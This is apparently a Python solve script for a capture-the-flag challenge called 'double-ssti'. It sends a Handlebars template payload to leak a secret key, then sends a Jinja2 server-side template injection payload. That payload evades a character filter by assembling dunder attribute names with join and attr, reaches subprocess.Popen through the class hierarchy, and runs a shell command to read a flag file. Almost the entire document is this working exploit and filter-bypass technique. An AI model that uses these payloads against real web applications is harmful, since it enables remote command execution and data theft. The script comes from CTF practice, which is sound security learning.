from requests import get, post
from urllib.parse import urlencode
from html import unescape

def first_stage(payload):
    url = "https://double-ssti.chal.h4ck3r.quest/welcome?"

    payload = payload.strip()

    res = get(url+urlencode({"name": payload}))

    print(res.text)

# first_stage(payload = """
# {{#each this}}
# Key: {{@key}} -> {{this}}
# {{/each}}
# """)

# Secret Key = 77777me0w_me0w_s3cr3t77777

def second_stage(payload):

    url = "https://double-ssti.chal.h4ck3r.quest/2nd_stage_77777me0w_me0w_s3cr3t77777/"

    # print(payload, end="\n\n\n")

    res = post(url, data={
        "name": payload
    })

    print(unescape(res.text)[9:-4].strip()[1:-7])

# Filter Out:
# - .
# - []
# - __
# No Filter Of
# - request
# - attr
# - args
# - _  -->> lol

# test('{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read() }}')
# Not Work

get_class = '(("_", "_", "class", "_", "_")|join)'
get_mro = '(("_", "_", "mro", "_", "_")|join)'
get_sub = '(("_", "_", "subclasses", "_", "_")|join)'

get_Temp = '(("_TemplateReference", "_", "_", "context")|join)'
get_init = '(("_", "_", "init", "_", "_")|join)'
get_globals = '(("_", "_", "globals", "_", "_")|join)'
get_doc = '(("_", "_", "doc", "_", "_")|join)'

second_stage('''
{% for item in ((((""|attr((("_", "_", "class", "_", "_")|join)))|attr((("_", "_", "mro", "_", "_")|join)))|last)|attr((("_", "_", "subclasses", "_", "_")|join)))() %}
    {{ item("cat /y000_i_am_za_fl4g", shell=True, stdout=-1)|attr("communicate")() if item|attr((("_", "_", "name", "_", "_")|join)) == "Popen"}}
{% endfor %}
''')
